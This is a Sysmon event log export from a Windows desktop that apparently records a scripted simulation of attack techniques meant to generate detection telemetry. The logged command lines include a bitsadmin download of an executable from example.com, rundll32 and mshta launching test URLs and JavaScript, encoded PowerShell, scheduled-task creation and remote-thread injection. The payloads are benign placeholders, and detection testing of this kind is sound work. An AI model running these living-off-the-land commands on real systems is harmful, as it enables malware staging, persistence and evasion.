"11/27/2025 11:35:09 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:05:09.984
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-92d5-6928-7c13-000000000b00}
TargetProcessId: 13400
TargetImage: <unknown process>
NewThreadId: 3680
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:09 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:09.819
ProcessGuid: {3a35410f-92d5-6928-7b13-000000000b00}
ProcessId: 15484
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test33') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:09 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:09.785
ProcessGuid: {3a35410f-92d5-6928-7a13-000000000b00}
ProcessId: 15468
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=49 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11599931017 --metrics-shmem-handle=9424,i,7469006147419133678,2586373073754828217,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190709032226922095 --mojo-platform-channel-handle=7356 /prefetch:1
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ParentProcessId: 11048
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:09 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:09.489
ProcessGuid: {3a35410f-92d5-6928-7813-000000000b00}
ProcessId: 16248
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data\Crashpad"" ""--metrics-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" --url=https://cr.brave.com --annotation=plat=Win64 --annotation=prod=Brave --annotation=ver=142.1.84.141 --initial-client-data=0x120,0x124,0x128,0xfc,0x12c,0x7ffd9b025a28,0x7ffd9b025a34,0x7ffd9b025a40
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92d5-6928-7713-000000000b00}
ParentProcessId: 16164
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/32
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:09 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:09.259
ProcessGuid: {3a35410f-92d5-6928-7713-000000000b00}
ProcessId: 16164
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/32
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92d3-6928-6613-000000000b00}
ParentProcessId: 15772
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/32 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:09 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:05:09.079
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask32
CreationUtcTime: 2025-11-27 18:05:09.079
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:35:09 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:09.030
ProcessGuid: {3a35410f-92d5-6928-7513-000000000b00}
ProcessId: 16124
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdQBzAHAAaQBjAGkAbwB1AHMAXwBlAHYAZQBuAHQAXwAzADIAJwA= 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:09 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:08.988
ProcessGuid: {3a35410f-92d4-6928-7413-000000000b00}
ProcessId: 16104
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=48 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11599167302 --metrics-shmem-handle=9744,i,3123844306018630021,10065928468400096660,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190709031289880246 --mojo-platform-channel-handle=9748 /prefetch:1
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ParentProcessId: 11048
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:08 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:08.912
ProcessGuid: {3a35410f-92d4-6928-7313-000000000b00}
ProcessId: 16064
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:08 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:08.847
ProcessGuid: {3a35410f-92d4-6928-7113-000000000b00}
ProcessId: 16036
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job32 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:08 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:08.707
ProcessGuid: {3a35410f-92d4-6928-6f13-000000000b00}
ProcessId: 15972
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job32 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:08 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:08.612
ProcessGuid: {3a35410f-92d4-6928-6d13-000000000b00}
ProcessId: 15924
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job32 http://example.com/file.exe C:\Temp\file32.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:08 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:08.439
ProcessGuid: {3a35410f-92d4-6928-6b13-000000000b00}
ProcessId: 15892
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job32 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:08 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:08.295
ProcessGuid: {3a35410f-92d4-6928-6813-000000000b00}
ProcessId: 15844
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask32 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:08 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:05:08.197
ProcessGuid: {3a35410f-92d2-6928-5f13-000000000b00}
ProcessId: 14924
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_fvekbge5.fvr.ps1
CreationUtcTime: 2025-11-27 18:05:08.196
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:08 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:08.169
ProcessGuid: {3a35410f-92d4-6928-6713-000000000b00}
ProcessId: 15816
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask32 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:08 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:07.955
ProcessGuid: {3a35410f-92d3-6928-6613-000000000b00}
ProcessId: 15772
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/32 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:07 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:05:07.858
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-92d3-6928-6513-000000000b00}
TargetProcessId: 15760
TargetImage: <unknown process>
NewThreadId: 15764
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:07 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:07.533
ProcessGuid: {3a35410f-92d3-6928-6413-000000000b00}
ProcessId: 15688
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --start-stack-profiler --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=47 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11597827782 --metrics-shmem-handle=6560,i,3772812592045456297,13291120117105030987,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190709030352838397 --mojo-platform-channel-handle=6288 /prefetch:1
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ParentProcessId: 11048
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:07 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:07.425
ProcessGuid: {3a35410f-92d3-6928-6313-000000000b00}
ProcessId: 15648
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test32') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:07 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:07.252
ProcessGuid: {3a35410f-92d3-6928-6213-000000000b00}
ProcessId: 15540
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data\Crashpad"" ""--metrics-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" --url=https://cr.brave.com --annotation=plat=Win64 --annotation=prod=Brave --annotation=ver=142.1.84.141 --initial-client-data=0x124,0x128,0x12c,0x100,0x98,0x7ffd9b025a28,0x7ffd9b025a34,0x7ffd9b025a40
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92d3-6928-6113-000000000b00}
ParentProcessId: 15456
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/31
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:07 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:07.026
ProcessGuid: {3a35410f-92d3-6928-6113-000000000b00}
ProcessId: 15456
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/31
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
